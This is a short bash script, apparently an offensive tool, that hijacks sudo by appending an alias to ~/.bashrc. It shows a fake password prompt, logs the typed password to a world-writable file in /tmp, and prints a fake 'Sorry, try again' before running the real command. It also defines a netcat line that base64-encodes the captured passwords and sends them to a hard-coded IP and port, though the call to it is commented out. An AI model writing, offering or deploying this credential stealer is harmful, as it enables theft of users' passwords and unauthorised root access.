addr="192.168.0.108"
port="8090"
pssf="/tmp/sudo_f.txt"
touch $pssf
chmod 777 $pssf

send_pass1="cat $pssf 2> /dev/null | base64 | nc $addr $port &> /dev/null"
if [ "$1" == "sudo" ] && [ -n "$2" ]; then
        printf "[sudo] password for $USER: "
        stty -echo
        read -r password
        echo "$password" >> $pssf
        # eval $send_pass1
        # rm $pssf
        echo -e
        stty echo
        sleep 2
        echo -e "Sorry, try again."
        $@
fi


echo alias sudo=\'~/.sudo_f.sh sudo\' >> ~/.bashrc